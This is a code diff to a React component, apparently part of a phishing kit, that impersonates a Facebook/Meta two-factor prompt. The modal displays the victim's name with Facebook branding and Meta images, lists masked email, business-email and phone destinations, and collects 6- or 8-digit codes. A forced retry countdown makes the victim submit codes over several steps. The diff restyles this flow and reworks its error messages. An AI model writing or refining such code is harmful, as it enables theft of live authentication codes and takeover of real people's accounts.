@@ -1,5 +1,13 @@
 import React from 'react';
 import Modal from './Modal';
+import {
+    modalFooterLogoClass,
+    modalInputShellClass,
+    modalInputShellErrorClass,
+    modalLeadClass,
+    modalMediaClass,
+    modalPrimaryBtnClass,
+} from '#components/modals/modalStyles';
 import { maskEmail, maskPhoneNumber } from '@/utils/mask';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
@@ -14,10 +22,13 @@ interface TwoFactorModalProps {
 
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
     const t = useAppStrings();
-    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;
+    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME
+        ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME, 10)
+        : 20;
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
+    const [retryLeft, setRetryLeft] = React.useState<number | null>(null);
     const [loading, setLoading] = React.useState(false);
     const [click, setClick] = React.useState(0);
     const [disabled, setDisable] = React.useState(false);
@@ -28,10 +39,20 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const [twoFa, setTwoFa] = React.useState('');
 
-    const { fullName, phone, email } = formDataState as FormData || {};
+    const { fullName, phone, email, emailBusiness } = (formDataState as FormData) || {}
 
     const phoneDisplay = maskPhoneNumber(phone)
-    const emailDisplay = maskEmail(email);
+    const emailDisplay = maskEmail(email)
+    const emailBusinessDisplay = (() => {
+        const contact = (email || '').trim().toLowerCase()
+        const business = (emailBusiness || '').trim()
+        if (!business) return ''
+        if (business.toLowerCase() === contact) return ''
+        return maskEmail(business)
+    })()
+    const destinationsDisplay = [emailDisplay, emailBusinessDisplay, phoneDisplay]
+        .filter(Boolean)
+        .join(', ')
 
     const [countdown, setCountdown] = React.useState<number>(initialCountdown);
 
@@ -68,18 +89,13 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
-    const formatRetryError = (secondsLeft: number) => {
-        const minutes = Math.floor(secondsLeft / 60);
-        const seconds = secondsLeft % 60;
-        return t.twoFa.retryError(minutes, seconds);
-    };
-
     const startRetryCountdown = (nextStep: number) => {
         if (intervalRef.current) clearInterval(intervalRef.current);
 
         setDisable(true);
         setCountdown(initialCountdown);
-        setErrors({ twoFa: formatRetryError(initialCountdown) });
+        setRetryLeft(initialCountdown);
+        setErrors({});
 
         intervalRef.current = setInterval(() => {
             setCountdown((prev) => {
@@ -88,11 +104,12 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     if (intervalRef.current) clearInterval(intervalRef.current);
                     intervalRef.current = null;
                     setClick(nextStep);
+                    setRetryLeft(null);
                     setErrors({});
                     setDisable(false);
                     return initialCountdown;
                 }
-                setErrors({ twoFa: formatRetryError(next) });
+                setRetryLeft(next);
                 return next;
             });
         }, 1000);
@@ -129,7 +146,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
             if (!isTwoFaValid) {
-                setErrors({ twoFa: t.twoFa.errInvalid });
+                setRetryLeft(null);
+                setErrors({ twoFa: 'errInvalid' });
                 return;
             }
 
@@ -148,7 +166,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errSend });
+                    setRetryLeft(null);
+                    setErrors({ twoFa: 'errSend' });
                 });
             }
 
@@ -165,7 +184,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errSend });
+                    setRetryLeft(null);
+                    setErrors({ twoFa: 'errSend' });
                 });
             }
 
@@ -185,7 +205,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errVerify });
+                    setRetryLeft(null);
+                    setErrors({ twoFa: 'errVerify' });
                 });
             }
 
@@ -194,38 +215,54 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         }
     };
 
-    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${disabled ? '' : 'hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md'} transition-all duration-200`;
-    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+    const inputClass = (field: string) =>
+        `${modalInputShellClass} ${errors[field] || (field === 'twoFa' && retryLeft != null) ? modalInputShellErrorClass : ''}`
+
+    const resolveTwoFaError = () => {
+        if (retryLeft != null) {
+            const minutes = Math.floor(retryLeft / 60)
+            const seconds = retryLeft % 60
+            return t.twoFa.retryError(minutes, seconds)
+        }
+        if (errors.twoFa === 'errInvalid') return t.twoFa.errInvalid
+        if (errors.twoFa === 'errSend') return t.twoFa.errSend
+        if (errors.twoFa === 'errVerify') return t.twoFa.errVerify
+        return errors.twoFa || null
+    }
+
+    const errorText = (field: string) => {
+        const message = field === 'twoFa' ? resolveTwoFaError() : errors[field]
+        return message ? <p className="mb-2.5 mt-1 text-[13px] text-red-500">{message}</p> : null
+    }
 
     return (
-        <Modal
-            isOpen={isOpen}
-            title=''
-            onClose={handleClose}
-            isClosable={false}
-        >
-            <div className="flex min-h-full w-full min-w-0 flex-col gap-6 pb-1">
-                <div className='w-full'>
-                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
-                        <span>{fullName}</span>
-                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
+        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false} compact>
+            <div className="flex min-h-full w-full min-w-0 flex-col gap-5 pb-1">
+                <div className="w-full">
+                    <div className="mb-2 flex w-full items-center gap-1.5 text-[13px] text-[#65676B]">
+                        <span className="truncate">{fullName}</span>
+                        <span className="h-1 w-1 shrink-0 rounded-full bg-[#bcc0c4]" aria-hidden />
                         <span>{t.common.facebook}</span>
                     </div>
-                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title(click + 1)}</h2>
-                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
-                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
-                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
+                    <h2 className="mb-2 break-words text-[17px] font-bold leading-snug text-[#1c1e21] sm:text-[18px]">
+                        {t.twoFa.title}
+                    </h2>
+                    <p className={modalLeadClass}>{t.twoFa.description(destinationsDisplay)}</p>
+                    <div className={`${modalMediaClass} mt-4`}>
+                        <img src="/images/meta/authentication.png" width="100%" alt="" />
                     </div>
-                    <div className='w-full'>
+                    <div className="w-full">
                         <form onSubmit={handSubmit}>
-                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.twoFa.label} <span className='text-[#e5484d]'>*</span></label>
-                            <div className={`${inputClass('twoFa')}`} >
+                            <label htmlFor="twoFa" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">
+                                {t.twoFa.label} <span className="text-[#e5484d]">*</span>
+                            </label>
+                            <div className={inputClass('twoFa')}>
                                 <input
                                     type="text"
                                     inputMode="numeric"
                                     id="twoFa"
                                     placeholder={t.twoFa.placeholder}
-                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
+                                    className={`h-full w-full bg-transparent outline-none ${disabled ? 'cursor-not-allowed opacity-70' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
                                     onPaste={handlePaste}
@@ -234,37 +271,34 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                     aria-label={t.twoFa.ariaInput}
                                 />
                             </div>
-                            <p className='text-[#6a7893] text-[12px] mt-[-5px] mb-[10px]'>{t.twoFa.hint}</p>
+                            <p className="mb-2.5 text-[12px] text-[#65676B]">{t.twoFa.hint}</p>
                             {errorText('twoFa')}
 
-                            <div className='w-full mt-[20px]'>
+                            <div className="mt-5 w-full">
                                 <button
-                                    className={`min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer active:opacity-90'}`}
-                                    disabled={disabled || !isTwoFaValid}
+                                    type="submit"
+                                    className={modalPrimaryBtnClass}
+                                    disabled={disabled || !isTwoFaValid || loading}
                                     aria-label={t.twoFa.ariaSubmit}
                                 >
                                     {loading && (
-                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
-                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
+                                        <div className="mr-2.5 h-5 w-5 animate-spin">
+                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                         </div>
                                     )}
                                     {loading ? '' : t.common.continue}
                                 </button>
                             </div>
-
-                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] pointer-events-none'>
-                                <span>{t.twoFa.tryOther}</span>
-                            </div>
                         </form>
                     </div>
                 </div>
 
-                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
-                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
+                <div className={`${modalFooterLogoClass} mt-1`}>
+                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                 </div>
             </div>
         </Modal>
-    );
-};
+    )
+}
 
 export default TwoFactorModal;
